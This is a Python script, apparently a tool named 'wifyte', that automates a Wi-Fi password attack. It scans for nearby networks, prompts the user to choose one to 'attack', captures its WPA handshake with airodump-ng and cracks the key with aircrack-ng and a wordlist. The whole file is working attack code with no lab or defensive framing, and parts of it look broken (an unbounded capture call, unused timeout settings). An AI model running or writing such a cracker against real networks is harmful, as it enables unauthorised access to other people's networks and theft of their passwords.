import os
import subprocess
import time
import sys
from colorama import Fore, Style, init
from typing import List
from collections import namedtuple
import logging
import re

# Initialize colorama
init(autoreset=True)

# Initialize logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)

# Configuration
WORDLIST = os.getenv("WIFYTE_WORDLIST", "wifyte.txt")  # Path to the wordlist file
TIMEOUT = 180  # Timeout for capturing handshake (3 minutes)
SCAN_DURATION = 12  # Total scanning duration in seconds
SCAN_INTERVAL = 4  # Interval between scans in seconds

Network = namedtuple("Network", ["BSSID", "Channel", "SSID", "Signal"])


def run_command(command: List[str]) -> str:
    """Run shell command and return output."""
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        logging.error(f"Command failed: {' '.join(command)}\n{e}")
        sys.exit(1)


def detect_wifi_adapter() -> str:
    """Detect available Wi-Fi adapter that supports monitor mode."""
    output = run_command(["iwconfig"])
    adapters = [line.split()[0] for line in output.split("\n") if "IEEE 802.11" in line]
    if not adapters:
        logging.error("No Wi-Fi adapter found that supports monitor mode.")
        sys.exit(1)
    logging.info(f"Using Wi-Fi adapter: {adapters[0]}")
    return adapters[0]


def enable_monitor_mode(interface: str) -> str:
    """Enable monitor mode on the selected Wi-Fi adapter."""
    run_command(["airmon-ng", "check", "kill"])
    run_command(["airmon-ng", "start", interface])
    return f"{interface}mon"


def scan_networks(interface: str) -> List[Network]:
    """Scan for available Wi-Fi networks."""
    logging.info("Scanning for available Wi-Fi networks...")
    networks = []
    output = run_command(["timeout", "10", "airodump-ng", interface])

    for line in output.split("\n"):
        match = re.search(r"([\dA-F:]{17})\s+(\d+)\s+-?(\d+)\s+.+?([\w\s-]+)", line)
        if match:
            bssid, channel, signal, ssid = match.groups()
            networks.append(Network(bssid, channel, ssid.strip(), int(signal)))

    if not networks:
        logging.warning("No networks detected. Please try again.")
        sys.exit(1)

    for i, net in enumerate(networks):
        signal_strength = abs(net.Signal)
        color = (
            Fore.GREEN
            if signal_strength <= 50
            else Fore.YELLOW if signal_strength <= 70 else Fore.RED
        )
        print(
            f"{i + 1}. {color}SSID: {net.SSID}, BSSID: {net.BSSID}, Channel: {net.Channel}, Signal: {net.Signal} dBm"
        )

    return networks


def capture_handshake(interface: str, bssid: str, channel: str) -> str:
    """Capture WPA handshake."""
    logging.info(f"Attempting to capture handshake from BSSID: {bssid}...")
    cap_file = "handshake.cap"

    run_command(
        [
            "airodump-ng",
            "--bssid",
            bssid,
            "--channel",
            channel,
            "--write",
            "handshake",
            interface,
        ]
    )

    if os.path.exists(cap_file):
        logging.info("Handshake successfully captured!")
        return cap_file

    logging.error("Failed to capture handshake.")
    return ""


def crack_handshake(cap_file: str, wordlist: str, target_bssid: str):
    """Attempt to crack the captured handshake using a wordlist."""
    logging.info(f"Cracking handshake using wordlist: {wordlist}")
    result = run_command(["aircrack-ng", "-w", wordlist, "-b", target_bssid, cap_file])

    if "KEY FOUND!" in result:
        password = re.search(r"KEY FOUND! \[(.*?)\]", result).group(1)
        logging.info(f"Password successfully cracked: {password}")
    else:
        logging.warning("Password not found.")


def disable_monitor_mode(interface: str):
    """Disable monitor mode on the Wi-Fi adapter."""
    logging.info(f"Disabling monitor mode on {interface}...")
    run_command(["airmon-ng", "stop", interface])


def main():
    adapter = detect_wifi_adapter()
    monitor_interface = enable_monitor_mode(adapter)
    try:
        networks = scan_networks(monitor_interface)
        choice = int(input("Enter the number of the network you want to attack: ")) - 1

        if choice < 0 or choice >= len(networks):
            logging.error("Invalid selection.")
            sys.exit(1)

        target = networks[choice]
        cap_file = capture_handshake(monitor_interface, target.BSSID, target.Channel)
        if cap_file:
            crack_handshake(cap_file, WORDLIST, target.BSSID)
    finally:
        disable_monitor_mode(monitor_interface)
        logging.info("Program finished.")


if __name__ == "__main__":
    main()
